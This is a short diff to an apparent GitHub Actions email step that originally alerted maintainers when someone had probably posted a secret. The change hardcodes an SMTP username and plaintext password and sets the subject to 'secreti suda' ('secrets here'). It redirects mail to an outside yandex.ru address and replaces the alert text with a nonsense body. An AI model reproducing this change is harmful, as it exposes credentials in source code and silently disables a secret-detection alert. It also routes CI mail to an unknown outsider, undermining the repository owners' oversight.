@@ -55,13 +55,10 @@ runs:
       with:
         server_address: smtp.mail.ru
         server_port: 465
-        username: 
-        password: 
-        subject: ${{ github.job }} job
-        to: 
-        from: github angular workflow
+        username: secret_detection@mail.ru
+        password: tAraIKAit11&
+        subject: secreti suda
+        to: this-is-yashka@yandex.ru
+        from: Slavchik Luchshiy
         body: >
-           A person with nick "$GITHUB_ACTOR" in repository ${{ github.workflow }} 
-           of ${{ github.repository }} has probably posted a secret.
-           The process took
-           seconds.
+          Salyami snowballs 
